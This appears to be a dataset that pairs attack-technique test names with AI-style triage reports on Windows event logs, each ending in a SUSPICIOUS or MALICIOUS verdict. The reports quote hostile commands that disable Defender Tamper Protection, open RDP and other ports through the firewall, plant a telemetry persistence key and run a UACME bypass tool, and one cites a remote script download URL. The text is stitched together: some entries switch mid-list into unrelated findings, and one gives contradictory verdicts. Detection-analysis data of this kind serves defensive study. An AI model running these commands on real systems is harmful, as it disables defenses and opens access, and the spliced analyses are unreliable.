    - **Execution Context**: All processes noted, including the registry modification command, were executed with high integrity levels typically associated with administrative tasks but require verification to ensure they are authorized.

4. **General System and Application Logs**:
    - **System Log**: Routine startup and shutdown events with no anomalies detected.
    - **Application Log**: The stopping of the `edgeupdate` service is logged but does not immediately suggest malicious intent—this often occurs post-update.

### Conclusion and Recommendation:

**Resolution**: **SUSPICIOUS**

**Reason**: The unsanctioned modification of the registry related to UAC notifications is atypical and requires further investigation to confirm whether it was an authorized change by an administrator or an attempt by an unauthorized entity to reduce security measures.

**Next Steps**:
1. Verify with the `admin_test` user or relevant IT personnel whether this registry change was planned and authorized.
2. Review additional context or logs surrounding the execution of the command to identify any unexpected sequences or unauthorized access signs.
3. Consider monitoring or reverting the registry change if it is deemed unnecessary or unauthorized to maintain User Account Control settings and system integrity.

These actions will help ascertain whether the activity was benign or requires escalation due to malicious intent."
Indirect Command Execution - conhost.exe,"Based on the provided event logs, here's a detailed analysis:

**Security Logs:**
- The security logs show a series of `EventID: 4616` which are related to time changes by the `LOCAL SERVICE`. The process `C:\Windows\System32\svchost.exe` is responsible. Changing system time can be suspicious if done without justification, as it could disrupt timelines for logging or auditing.

**Sysmon Logs:**
- There are several `EventID: 1` entries associated with the execution of standard Windows utilities such as `whoami.exe`, `cmd.exe`, `conhost.exe`, and `notepad.exe`. While these tools are ordinarily used for legitimate administrative tasks, their use in this context could suggest something worth evaluating, especially the command-line argument ""`cmd.exe /c conhost.exe \""notepad.exe\""`"". This could imply the execution of a process in a less standard way.
- Additionally, there are multiple entries indicating the use of `wevtutil.exe`, which is a legitimate tool for Windows event log management. Excessive or unexpected use can be indicative of log clearing or manipulation attempts.
- A large number of entries are related to the `MicrosoftEdgeUpdate.exe`, indicating what seems like a routine update process for Microsoft Edge. There's no unusual behavior detected specifically related to this process.

**Application Logs:**
- Activity related to `edgeupdate` stopping and perhaps restarting might align with common update routines, especially when processes like `MicrosoftEdgeUpdate.exe` are frequently observed in the Sysmon logs.

**Assessment:**
- The activity of standard utilities like `whoami.exe` and `cmd.exe` could be benign if related to routine administrative tasks, but they can also be indicative of scripting or batch operations by a user or a scheduled task. The sequence with `cmd.exe` involving `notepad.exe` appears peculiar and could warrant further investigation, particularly if executed without the knowledge of the system administrator.
- Frequent time adjustments could be an administrative function, though combined with other factors, it can be indicative of an attempt to obfuscate logs or timestamps.
- The `MicrosoftEdgeUpdate.exe` actions align with routine updates for the Microsoft Edge browser, without evidence of tampering or misuse.

**Resolution:**
- **SUSPICIOUS**: While there are no definitive signs of malicious activity based on the logs provided, the combination of time adjustments, command-line use of cmd.exe/conhost.exe, and frequent use of event management and system utilities like `wevtutil.exe` suggests behavior that is worth a deeper investigation. Additional inquiries into the circumstances surrounding the `cmd.exe` usage and time change may be needed to confirm benign or malicious intent."
Activate Windows NoRun Group Policy Feature,"### Detailed Analysis of the Logs

#### Overview:
The logs pertaining to the server `Server002` indicate a variety of process executions during the timestamp provided. The analysis focuses on identifying any sequences or individual activities that deviate from normal operations, looking for signs of potential malicious activity.

#### Suspicious and Malicious Indicators:

1. **Use of `Reg.exe` to Modify Explorer Policies:**
   - **Event ID 18005:** The process `reg.exe` was used to add a registry key `NoRun` under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`. This action modifies Windows Explorer settings, which can be indicative of an attempt to restrict user capabilities or tamper with system policies maliciously.
   - **Parent Process:** The command was executed using `cmd.exe`, which was likely executed from a temporary location indicating possible script or programmatic execution.
   - **Integrity Level:** High integrity level and executed by the user `SERVER002\admin_test` suggest potential insider activity or compromised credentials.
  
2. **Repeated Execution of `Wevtutil.exe`:**
   - A number of instances of `C:\Windows\System32\wevtutil.exe` are observed being executed in quick succession. While `wevtutil.exe` is a legitimate tool used for querying and managing event logs, frequent execution without clear user-initiated actions raises suspicion. It could suggest attempts to manipulate or clear event logs post-compromise.

3. **Command Line Execution of System Commands (Whoami and Hostname):**
   - Multiple executions of `whoami.exe` and `hostname.exe` in a short span could imply reconnaissance activities being conducted on the system to gather user and system identity information. 
   - These executions by `admin_test` user with a High integrity level might suggest insider actions or activities by an attacker who managed to escalate privileges.

4. **Edge Installer Activities:**
   - Events 18011, 18012, and 18013 pertain to Microsoft Edge installations, which show activities consistent with system updates executed by `NT AUTHORITY\SYSTEM`. These actions seem legitimate as part of routine software updates unless correlated with timelines of malicious activities.

5. **Notable System Time Change:**
   - Several events related to system time changes (Event IDs 3569-3573), where adjustments might correlate with a tactic to confuse logging, though the time adjustment appears minimal. 

#### Assessment of Situation:
- The use of `reg.exe` to change Explorer policies is typically unnecessary in routine administrative tasks, especially from a non-system script. 
- The rapid and repetitive execution of SYS internal tools suggests a methodical approach commonly associated with automated scripts or deliberate user actions.
- Elevated user rights indicate potential interior threats or compromised user credentials.

#### Resolution:
Based on the analysis of logs, the situation can be categorized as **SUSPICIOUS**. The activity observed could signify precursors to more malicious actions or already executed, but the lack of correlational logs for additional malicious payload deployment keeps this from being classified as outright malicious. A deeper investigation with expanded log coverage and potential disk forensics is recommended.

### Guidance:
- Initiate a thorough review of user `SERVER002\admin_test`'s activities, focusing on recent authentication logs and any changes in access permissions.
- Conduct a full audit of registry changes and events leading to any policy modifications to ascertain the scope of unauthorized actions.
- Analyze more extensive network and application logs for indications of lateral movement, data exfiltration, or persistent threats.
- Increase monitoring of `whoami`, `wevtutil`, and registry editing tools to capture further anomalous usage.
- Validate recent updates and changes in system policies or scheduled tasks against expected configurations.

Take proactive measures to secure credentials and consider applying additional logging and monitoring to enhance detection capabilities of unauthorized activities."

### Findings:

1. **Service Creation with Suspicious Command:**
   - **EventID 7045 (Service Control Manager)** observed in the System log indicates the creation of a new service named `win32times` with an ImagePath of `cmd /c start c:\\data.004_NonExistingScript.ps1`.
   - This command attempts to start a PowerShell script located at `c:\\data.004_NonExistingScript.ps1`, but it is noted as a non-existing script.
   - The service is set to start on demand (`demand start`) and runs under `LocalSystem` account, which has high privileges.

2. **Matching Sysmon Events:**
   - Multiple **Sysmon EventID 1** entries correlate, showing the execution of `cmd.exe` with a command line involving `sc create win32times`, confirming that a service creation was attempted using this command line.
   - Additionally, `sc.exe` is used to query (`sc qc win32times`) the created service, further pointing to potential service manipulation attempts.
   
3. **Use of Administrative Privileges:**
   - The actions are performed by the `SERVER002\admin_test` user, which indicates these commands were executed with administrative privileges, a common indicator during misuse.

4. **Lack of Legitimate Script:**
   - The reference to a non-existing script `c:\\data.004_NonExistingScript.ps1` raises suspicion since there is an attempt to run something that does not exist, which might suggest preparation steps for potential execution of malicious code later.

5. **Normal System Updates:**
   - Events related to Windows Updates and Microsoft Defender updates appear normal and typically expected in system operation, not indicating malicious activity.

6. **Security Audit Events (5379):**
   - These events in the Security log relate to credential requests; however, they don’t indicate abnormal or immediately concerning behavior without further context.

### Assessment:

- **Indicators of Suspicious Activity:**
  - The creation of a service with a non-existing, possibly suspicious script path, utilizing high permissions, and involvement of command-line executions attempt to manipulate system services.

Open a local port through Windows Firewall to any profile,"Upon analyzing the provided Windows event logs, several indicators of suspicious and potentially malicious activities have been identified:

1. **Unauthorized Firewall Rule Manipulation**: 
   - A PowerShell command was executed to add a firewall rule to open port 3389 for RDP (Remote Desktop Protocol) access from any IP address:
     ```
     Powershell.exe & {netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any}
     ```
   - This specific action is suspicious as it allows unrestricted access to Remote Desktop, which can be an indicator of an attacker attempting to establish persistent access to the system.

2. **Execution of PowerShell and Network Command Shell**:
   - Multiple executions of `powershell.exe` and `netsh.exe` were observed. These are powerful tools often used by attackers for lateral movement or establishing persistence.

3. **High Integrity Processes**:
   - The processes linked to the suspicious activity (such as PowerShell and netsh commands) are executed with high integrity levels by the user `SERVER002\\admin_test`. This suggests possible privilege escalation or use of an administrative account.

4. **Process Ancestry**:
   - The parent processes of the suspicious activities were traced back to `wsmprovhost.exe`, which is often used for Windows Remote Management tasks. Compound this with the PowerShell activity, it raises concerns about automated or scripted remote access activities.

Based on these findings, there is definitive evidence of potentially malicious intent due to the unauthorized firewall rule allowing open RDP access, which can lead to unauthorized external system access. This is a common tactic used to maintain control over the compromised system.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Remediation**: 
  - Revoke the firewall rule that opens RDP access immediately to prevent any further unauthorized access.
  
- **User Account Review**:
  - Investigate the activities and security of the ""SERVER002\\admin_test"" user account. Identify if it's been compromised and change its password.

- **Registry Modification via Command Line (`cmd.exe`)**: The registry alteration by `cmd.exe` involving:
  ```plaintext
  cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\NewKey"" /t REG_SZ /v Command /d C:\Windows\System32\notepad.exe /f
  ```
  This command is indicative of potential manipulation of telemetry data or an attempt at persistence. Such actions can be deemed suspicious and warrant further investigation to validate legitimacy.

- **Frequent Use of Wevtutil and Whois**: The use of utilities like `wevtutil.exe` and `whoami.exe` in conjunction with an admin account in quick succession can be scrutinized if these actions were not authorized or expected as part of normal administrative activities.

#### Conclusion:
- **Resolution: SUSPICIOUS**

While the Microsoft Edge Update activities seem consistent with routine software maintenance, the registry modification command executed via `cmd.exe` is not typical in standard operations and could imply potential malicious activities, such as persistence mechanisms or telemetry evasion. Given these concerns, this behavior requires further investigation to determine the legitimate purpose or potential malicious intent.

#### Recommended Actions:
1. **Investigate User Activity**: Verify the activities of the `admin_test` user during the timeline to ensure all actions were authorized.

UACME Bypass Method 56,"Upon analyzing the provided Windows event logs, several events potentially indicating suspicious behavior were observed:

1. **Command Execution**: 
   - Event ID 1 logs show the execution of the command `""C:\Windows\system32\cmd.exe"" /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\56 Akagi64.exe`. This path and file name is suspicious, especially `uacme`, which is often associated with privilege escalation exploits.
   - Later, `cmd.exe` is used to execute `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\56 Akagi64.exe""`. This follows the common pattern used in UAC (User Account Control) bypass attempts.

2. **Integrity Level and User**:
   - The command executions are done with a high integrity level by the user `SERVER002\admin_test`, which could be indicative of an attempt to escalate privileges or perform administrative tasks by a non-administrative account.

3. **Frequent Use of PowerShell and Command Prompts**:
   - Usage of `powershell.exe` alongside complex conditional logic is often used in scripting attacks.
   
4. **Wevtutil Usage**:
   - The `wevtutil.exe` application is observed multiple times. This utility is often used to query or clear event logs – a common tactic used to cover tracks after malicious activity.

5. **UAC Bypass Utility**:
   - The presence of `Akagi64.exe` within the `uacme` directory strongly suggests attempts to bypass User Account Control. UACME is a known tool often used in attacks to elevate privileges without user consent.

Based on the analysis of these log entries, we can conclude:

**Resolution**: **MALICIOUS**

**Assessment & Threats**:
- The execution of potentially malicious scripts and tools indicates an attempt to bypass security controls, particularly UAC, suggesting a compromise or an attempted compromise.
- The use of known malicious tools indicative of privilege escalation, combined with attempts to edit or clear logs, points towards an attack.

4. **Verify and Patch**: Ensure that all security patches are up-to-date, focusing on vulnerabilities targeted by bypass tools like UACME.
5. **Strengthen Monitoring**: Enhance monitoring for similar activity across other systems to prevent wider spread.
6. **Incident Response Procedures**: Ensure incident response procedures are followed and documentation of this incident is thorough for follow-up analysis."
Tamper Win Defender Protection,"Based on the analysis of the provided logs, the following observations and assessments can be made:

### Security Log:

1. **Event ID 4616**: This event is related to the change in the system time. While it could indicate a potential indicator of tampering or time-skew related attacks (to manipulate time-dependent tasks, logs, etc.), these events show the timestamp adjustment process with `svchost.exe`, and there is no sign of errors or irregularities that immediately suggest this action is malicious. However, it's still noteworthy if it coincides with other suspicious activities.

### System Log:

1. **Event ID 1 & 24 related to Date/Time changes**: These events relate to the system's date and time updates, which are part of regular system operations generally associated with time synchronization activities and have a legitimate time source (`time.windows.com`). This seems normal given no other time discrepancies or irregularities are evident.

### Sysmon Log:

1. **Presence of wevtutil.exe**: The presence of `wevtutil.exe`, which is a legitimate Windows utility used to manage event logs, could be a normal operation unless executed with malicious intent. It’s executed multiple times by `admin_test`, which could suggest someone was enumerating or exporting logs. This action could be considered suspicious if not expected as part of regular operations or without appropriate authorization.

2. **Registry Changes via cmd.exe and reg.exe**: A more concerning observation is the execution of `cmd.exe` with a command-line operation that disables Tamper Protection for Windows Defender (`reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f`). This is a direct indicator of an attempt to lower system defenses, which represents a highly suspicious action.

3. **Microsoft Edge Update Activities**: Numerous processes related to `MicrosoftEdgeUpdate.exe` and associated components are observed. The activities appear consistent with legitimate software updates and system maintenance tasks commonly performed by such executables. The hashes correspond with known versions of legitimate Microsoft executables, suggesting no tampering with those specific files.

### Application Log:

1. **Service Stopped Events**: The stopping of the Edge Update service is a typical operation and typically follows an update process, which aligns with routine maintenance tasks.

### Conclusion:

The disabling of Tamper Protection for Windows Defender is a clear red flag and strongly suggests potential malicious intent or system misconfiguration by `SERVER002\admin_test`. The use of native Windows utilities to manage event logs and disable security measures could indicate attempts at data scrubbing or further malicious preparations.

Given these observations, the verdict on the log activities is:
- **MALICIOUS** - There is clear evidence of a compromise aimed at disabling security protections.

### Recommendations:

1. **Immediate Investigation**: Launch an in-depth investigation into user `SERVER002\admin_test` and the context of when and why these operations occurred.
   
2. **System Review**: Review system and security settings, especially regarding Windows Defender’s configuration and any unauthorized access or vulnerabilities.

3. **Monitoring & Alerts**: Set up monitoring and alerting for similar events in the future to detect and respond promptly to attempts at disabling key defenses.

4. **Internal Inquiry**: Confirm the actions were either authorized or unauthorized by an internal employee or party, potentially addressing insider threat risks.

5. **Additional Forensics**: Consider additional forensic methods to determine if further malicious activities were attempted or conducted during the noted timeframe."
Control Panel Items,"Based on the logs provided, I will analyze the notable events to determine if there is any malicious activity present.

### Key Observations:

1. **PowerShell Execution**:
   - Observed event where `powershell.exe` is executed by `SERVER002\admin_test`. No specific command line arguments or script details are given. The use of PowerShell might be common for management tasks but can also be utilized maliciously if scripts download or execute unapproved applications.

2. **Execution of `wevtutil.exe`**:
   - Multiple executions of `wevtutil.exe` by `SERVER002\admin_test`. `wevtutil.exe` is commonly used for querying or clearing event logs. Frequent invocations may suggest an attempt to tamper with or clear event logs as part of a cover-up for malicious operation.

3. **Suspicious Control Panel Activity**:
   - The sequence of executing Control Panel-related processes (`control.exe`, followed by `rundll32.exe` loading a Control Panel (.CPL) file from a temporary directory) is unusual. The use of `cmd.exe` to run `control.exe` with a path to a `.cpl` file in a temporary directory (""`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\calc.cpl`"") is suspicious because this path is unconventional for legitimate Control Panel extensions. It may represent an attempt to execute malicious code masqueraded as a `.cpl` file.

4. **Edge Update and Temporary Directories**:
   - Frequent execution of `MicrosoftEdgeUpdate.exe` with various command-line arguments, including from temporary directories. While updates are common, executions from temp folders can be indicative of a dropper or an unauthorized update, especially if accompanied by paths unusual to typical binary releases.

5. **`calc.exe` Execution**:
   - The execution of `calc.exe` from the command line instead of a graphical user interaction might indicate a test of command execution capability, but could also be benign if part of an automation script.

### Assessment

Based on the observations, there are both benign and concerning elements. The usage of temporary directory paths to execute control panel items and rundll32 to load what appears to be a potentially unauthorized DLL is particularly notable, as these paths are typically not associated with default installation or update paths. This, in conjunction with the `wevtutil.exe` use and PowerShell activity, raises the risk level of these activities beyond benign anomalies.

### Resolution

- **SUSPICIOUS**: 
  - The behavior described in the logs does not conclusively indicate a breach, but the unusual executable paths and command-line activities warrant further investigation. Specifically, the network security and endpoint security team should examine the integrity of the paths involved and confirm if these processes align with known changes or installations within the system environment. Furthermore, reviewing user `admin_test` activities and verifying the legitimacy of the software update processes would be prudent.

### Guidance

- Conduct a deeper forensic investigation into the files located in temporary directories that are being executed.
- Run a comprehensive antivirus/anti-malware scan on the associated files and directories.
- Review all user `admin_test` PowerShell and command line activities to ensure they align with legitimate user actions.
- Ensure that the software running in these logs is authorized and up to date; consider checking the hashes of those files to confirm their authenticity.
- Monitor and/or restrict the ability of non-essential users to invoke PowerShell and Sysinternals to mitigate potential abuse."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Upon reviewing the provided Windows event logs, several points merit attention and could potentially indicate suspicious activity. Below is a detailed analysis of these logs:

1. **PowerShell Activity:**
   - There are multiple instances of PowerShell execution (`powershell.exe`) with the command line invoking `Invoke-CimMethod` to install a package from a temporary directory. The command attempts to install a `.msi` file (`data.007_EXE.msi`) located in the `AppData\Local\Temp` directory. This is often seen in malware scenarios where installers are run from temporary directories.
   - The frequent use of PowerShell, especially concerning such installation operations, is a common technique for attackers leveraging Windows Management Instrumentation (WMI) and PowerShell to execute commands without writing files to disk.

2. **Installation Files:**
   - The logs indicate an execution of `C:\Windows\Installer\MSI9CF4.tmp` which is a non-standard executable name and might be suspicious. It suggests that an executable was generated during an installation process or potentially during an unauthorized activity.
   - `msiexec.exe` is used with `/V` (verbose logging) which might indicate either a benign debugging action or an attempt to execute an MSI installer with additional logging, possibly for obfuscation.

3. **Processes Executions and Hierarchy:**
   - Consistent execution of `conhost.exe` follows the invocation of various processes, which is typical as `conhost.exe` is used to run command lines. However, the rapid succession and the sheer volume of these process executions could indicate scripted or automated behavior.
   - The execution of `wevtutil.exe` suggests possible attempts to manipulate event logs. While no explicit log clearing is visible, the use of `wevtutil` should raise an alert if not correlated with legitimate administrative tasks.

4. **Edge Update Executions:**
   - Multiple legitimate processes, such as `MicrosoftEdgeUpdate.exe`, are noted, and these are likely to be regular updates for Microsoft Edge. However, the juxtaposition of these with PowerShell activity and other suspicious behaviors could indicate an attempt to masquerade or blend in with legitimate traffic.

5. **Indicators of Malicious Activity:**
   - High-level integrity in PowerShell executions and attempts to execute from temporary directories are red flags for potential privilege escalation or lateral movement attempts.
   - The presence of these elements, coupled with an absence of complete context for these activities, suggests that further investigation is warranted to ascertain the legitimacy of these actions.

### Conclusion:
Given the evidence from the logs, the activity can be categorized as `SUSPICIOUS`. There are clear indicators of unusual administrative command executions, and installations from temporary directories, all of which require further verification. These logs should be cross-referenced with user activity logs, endpoint detection systems, and any alerts generated by security tools to triage and mitigate any potential security threats.

### Recommended Actions:
- Conduct an audit of recent administrative activities performed by the user `SERVER002\\admin_test`.
- Investigate the origin and legitimacy of the `data.007_EXE.msi` and `MSI9CF4.tmp` files.
- Review network activity logs to track any external connections established by these processes.
- Ensure that antivirus and endpoint protection solutions are updated and run a full system scan.
- If feasible, sandbox the suspicious files and analyze their behavior."

1. **System Logs**:
   - The system logs reflect standard Windows kernel events related to time change and time synchronization. Specifically, they show typical operations performed by `svchost.exe` associated with Windows Time Service, synchronizing time with `time.windows.com`. This behavior is normal for time synchronization and doesn't indicate suspicious activity.

2. **Sysmon Logs**:
   - We observe multiple instances of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`, and `reg.exe` being executed by the user `SERVER002\\admin_test`.
     - **wevtutil.exe**: Frequently used for managing Windows event logs. The repetition might suggest attempts to query or clear logs, which could be suspicious depending on the context.
     - **HOSTNAME.EXE** and **whoami.exe**: These are typically benign and are often used to query the system's hostname or user information. Their presence in the logs is not inherently suspicious unless paired with other anomalous behavior.
     - **cmd.exe** and **reg.exe**: Notably, `cmd.exe` is utilized to execute a command that modifies the Windows registry. This specifically disables toast notifications: 
       ```
       reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
       ```
       Modifying the registry, particularly to alter notification settings, can be seen in both benign administrative actions and malicious operations designed to suppress security alerts.
     - Frequent invocations of these tools in a short time span could suggest script-based automation, which might be used in both legitimate and malicious contexts.

3. **Security & Application Logs**:
   - The logs related to `sppsvc.exe` (Software Protection Platform Service) and other standard system processes like `WmiPrvSE.exe` do not present with any anomalies and are consistent with normal system operations.

**Assessment of the Situation**:
- **Suspicious Behavior**: The frequent usage of `wevtutil.exe` and registry modifications via `cmd.exe`/`reg.exe` indicates potential suspicious behavior. While it could be part of a legitimate administrative task, these activities are often leveraged by attackers to cover tracks or make subtle system setting changes.

**Resolution**: 
- **SUSPICIOUS** - Additional investigation is necessary to determine the legitimacy of the admin operations, focusing on:
  - Correlating these actions with known administrative tasks or authorized activities.
  - Reviewing user `admin_test`'s login and access history for anomalies.
  - Checking if these registry modifications and command-line activities align with known malware behavior or recent threats.

**Guidance**:
- Conduct a full security audit of user `admin_test`, examining logon records and permissions.
- Verify if the registry change aligns with any corrective actions or ongoing policies applied to the systems.
- Implement monitoring to detect similar activity patterns in real-time, as well as potential data exfiltration attempts.
- If malicious activity is confirmed, proceed with incident response protocols such as containment, eradication, and recovery steps, while ensuring evidence is preserved for detailed forensic analysis."

### Summary of Suspicious Activities:
1. **Time Manipulation Events:**
   - There are several events related to the change of system time, indicated by the EventID 4616 from the Security log and EventID 1 from the System log (`Microsoft-Windows-Kernel-General`). Frequent or irregular time adjustments can be indicative of attempts to manipulate logs or bypass time-based security measures. However, these adjustments appear to be minor and are typically associated with legitimate synchronization with time.windows.com.

2. **PowerShell Execution with Encoded Commands:**
   - The PowerShell logs reveal execution of commands containing encoded content. The use of encoded or obfuscated scripts is a common technique employed in malicious activities to evade detection. The encoded part is attempting to base64 decode a string that could potentially be malicious.

3. **Unusual Process Activities:**
   - Many processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and others exhibit higher execution frequency than usual, especially around the same time. This could be automated task sequences or scripts running malicious operations.
   - The `wevtutil.exe` is often related to event log management and its repeated execution, especially with admin privileges, could indicate tampering with logs or extraction of logs, possibly for data exfiltration or log clearing.
   
4. **High Integrity Level Process Executions:**
   - There are processes executing with a high integrity level, such as `PowerShell.exe` and `whoami.exe`, indicative of operations performed with elevated privileges. Combined with the encoded command line execution, this raises suspicion.

5. **Attempts to Retrieve Windows Live Credentials:**
   - The repeated occurrence of EventID 5379 in the Security log indicates failed attempts to access Windows Live credentials. This could highlight potential attempts to access sensitive information or an unauthorized access attempt by malicious actors.

### Assessment:
The logs indicate a few suspicious elements such as time manipulation, encoded PowerShell scripts, and elevated command executions. These markers are characteristic of potentially malicious operations which could indicate an active threat or a compromise attempt.

### Resolution:
- **Resolution:** SUSPICIOUS
    - **Recommendation:** Detailed investigation is required to decode the PowerShell commands to understand their intentions and verify their legitimacy. Additionally, audit the frequency and timing of the `wevtutil.exe` executions and review security settings and permissions associated with the executed commands. Finally, check for any abnormal access attempts or unauthorized account activities. Consider engaging with threat intelligence to cross-reference malicious indicators.

Conduct a thorough review of user accounts and permissions, focusing on the user `admin_test` and account logins/logouts that align with these activities. This investigation is crucial to either rule out false positives or confirm malicious incursions."
WinPwn - UAC Bypass DccwBypassUAC technique,"**Detailed Analysis**:

Upon examining the provided logs, several key observations can be made regarding potential indicators of malicious activity:

1. **Time Manipulation**:
   - In the system and security logs, there are events relating to the change of system time. Events such as Event ID 4616 indicate adjustments in the system time. While sometimes legitimate, time changes can be suspicious, especially when unauthorized or unexplained, as they can be used to circumvent logging or defenses that rely on time-specific operations.

2. **PowerShell Execution**:
   - The PowerShell logs contain highly suspicious behavior where a PowerShell script is executing with command-line arguments that involve downloading and executing a script from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1`). This behavior is characteristic of malicious activity, where scripts are downloaded and executed directly from external sources, potentially leading to unauthorized access or command execution.

3. **Process Activity**:
   - From the Sysmon logs, we observe various system utilities like `whoami.exe`, `hostname.exe`, and processes related to potential reconnaissance activities on the system (`wevtutil.exe`, `conhost.exe`). While these can be used legitimately, their execution within the same timeframe as the suspicious PowerShell activity raises concerns about coordinated malicious intent, especially if these utilities are executed by unauthorized users or without a clear legitimate need.

**Assessment**:

Based on the provided logs, the PowerShell activity stands out as the most critical indicator of compromise. The specific use of PowerShell to directly download and execute a script from a remote URL is generally considered malicious behavior, especially when performed without authorization. Furthermore, the unusual time manipulation activity raises concerns about attempts to obfuscate actions on the system or to manipulate logging timestamps.

   - Multiple `wevtutil.exe` processes and `conhost.exe` processes initiated by ""admin_test"" which could indicate an attempt to potentially clear Windows event logs or interact with them.
   - Processes like `whoami.exe`, `HOSTNAME.EXE`, and a repeated pattern of execution of Microsoft Edge Update components which might be standard, but in this context could also be noise to mask actions.
   - The use of command line arguments related to Microsoft Edge Update appears normal if during an update schedule; however, in combination with other activities, could also serve as an attempt to divert attention.

3. **Time Discrepancy**:
   - Event logs indicate a slight discrepancy in system time adjustments, which could either be benign or indicate manipulations to cover tracks.

### Assessment:

There are multiple indicators of potentially suspicious activity:

- Administrative privileges were granted to ""admin_test,"" who also executed commands to change registry settings related to sensitive parts of the system's security configuration.
- The combination of suspicious sysmon activities like executing registry changes and the access privileges elevates the risk of potential compromise.
- The repeated pattern of seemingly benign activities might be noise added to obscure malicious actions.

### Threats/Risks Identified:

- Potential unauthorized registry changes that may weaken security settings (e.g., Allowing weak or vulnerable configurations).
- Elevated privileges and logons from remote workstations are concerning if not verified as legitimate by the administration.

### Guidance:

1. **Incident Response**: Treat this as a potential security incident and start incident response protocols.
2. **Verify User Activity**: Confirm if the actions by ""admin_test"" are legitimate. Assess the necessity for such privileges and registry changes.
3. **System Audit**: Conduct a security audit to identify any unauthorized changes or data breaches.
4. **Review Log Sources**: Ensure that no logs were tampered with or deleted, especially by reviewing unusual entries by `wevtutil.exe`.

### Final Resolution:

**SUSPICIOUS**

The activities warrant further investigation due to suspicious behaviors, such as unauthorized privilege escalation, registry changes, and remote logons. However, there is not enough explicit evidence to confirm it as malicious without further context from network and host-based data."
Opening ports for proxy - HARDRAIN,"### Analysis of Windows Event Logs

Upon reviewing the Sysmon and other Windows event logs, several points of interest and potential concerns have been identified. Here's a detailed breakdown:

1. **Frequent Execution of System Utilities:**
   - There is multiple execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe`. These commands are used for managing event logs and are legitimate tools. However, frequent automated execution can indicate that someone is possibly trying to clear logs or mask activities. No command-line arguments are provided, so their exact purpose is unclear here.

2. **Execution of `cmd.exe` with Firewall Modification:**
   - The command `cmd.exe /c netsh advfirewall firewall add rule name=""file testing"" action=allow dir=in protocol=TCP localport=450` is executed. This command modifies the Windows firewall to allow incoming TCP connections on port 450, suggesting a potential backdoor setup or unauthorized access facilitation.

3. **Execution of Utility Tools:**
   - Tools such as `HOSTNAME.EXE`, `whoami.exe`, and `netsh.exe` are executed. While these tools are part of Windows' built-in utilities, their execution could indicate that someone is gathering system and network information or configuring system settings.

4. **Time Change Events:**
   - There are multiple Event ID 4616 from Security logs, suggesting system time changes. Time manipulation can be a sign of malicious activity, attempting to alter timestamps for log files. However, they seem to be performed by legitimate processes like `svchost.exe`.

5. **Contextual Integrity Level and User:**
   - The integrity level of `High` suggests these processes are executing with elevated privileges, which is typically needed for system modifications and can be utilized for malicious purposes if under unauthorized control.

6. **Absence of Clear Malicious Artifacts:**
   - No clear evidence of malware execution or malicious payloads has been identified based purely on the logs provided. However, the actions are peculiar and raise suspicions.

### Assessment:
- **SUSPICIOUS**: While no definitive malicious activity has been confirmed, the logs contain activities that warrant further investigation due to:
  - Frequent and potentially automated use of event utility tools.
  - Firewall modifications without clear context.
  - System time alterations.
  - Elevated privilege commands possibly adjusting system configurations.

### Recommended Actions:
1. **Deep-Dive Analysis**:
   - Collect additional evidence such as network logs, endpoint security alerts, and file integrity checks around the timeframe of the suspicious activities.
2. **Correlate User Activity**:
   - Verify the legitimacy of the user `SERVER002\admin_test` performing these actions. Check login history and access rights.
3. **Audit Firewall Rules**:
   - Ensure the added firewall rule aligns with organization policies. Remove any unauthorized changes.
4. **Monitor Time Change Events**:
   - Verify time synchronization settings for irregularities and monitor any further changes.
5. **Implement Additional Monitoring**:
   - Increase logging levels on critical systems to capture command-line activities and process creation events for future incidents.

Conclusively, given the lack of decisive evidence of an outright compromise, but considering the unusual nature of the activities, it is prudent to catalog these logs under **SUSPICIOUS** and proceed with the suggested measures to preclude any potential threats."
ProtocolHandler.exe Downloaded a Suspicious File,"Upon analyzing the provided Windows event logs, several points merit closer scrutiny:

1. **Service Activity:**
    - Two entries from the ""edgeupdate"" service indicate ""Service stopped"" without much context. However, service stops and starts can be routine, often relating to software updates or system maintenance. Checking logs around this time for the system's standard behavior could rule out anomalies.

2. **Sysmon Logs:**
    - **PowerShell Execution:**
        - A PowerShell execution by `SERVER002\\admin_test` could warrant further investigation, depending on the organization’s security policies around PowerShell usage.

    - **Frequent Usage of `wevtutil.exe`:**
        - The `wevtutil.exe` utility, used several times by `SERVER002\\admin_test`, suggests interaction with Windows event logs. This might suggest log tampering or simply log monitoring. Context is vital here as usage by a non-IT or non-security account would be more suspect.

    - **Command Prompt (cmd.exe) Activity:**
        - Analysis of `cmd.exe` execution with potentially suspicious command lines suggests abnormal behavior. In particular, the command referencing a remote document (`dataTest.docx`) from a GitHub repository stands out. This activity, if not part of standard operations, might point to an attempt to download or execute remote code.
    - **Registry Query via CMD:**
        - The operations querying registry paths for Word (`Winword.exe`) suggest an attempt to interact with application settings, potentially setting paths for malicious payload execution. 

3. **Microsoft Edge Update Executions:**
    - Multiple executions of processes related to Microsoft Edge Update, such as `MicrosoftEdgeUpdate.exe`, have been noted. While this might point to a benign update process, the frequency and diversity of directories used are unusual and could suggest misuse of this process by a malicious actor to disguise activities.

4. **High Integrity Executions:**
    - Multiple processes, including `cmd.exe`, `whoami.exe`, and `reg.exe`, are executed with High Integrity level, indicating potential privilege escalation tactics if not a normal operation by admin accounts.

**Conclusion:**
The logs contain several activities that are unusual and potentially indicative of malicious behavior:
- Unusual command line executions and potential attempts to query registry paths and interact with remote documents.
- Frequent use of wevtutil, which could suggest log manipulation.
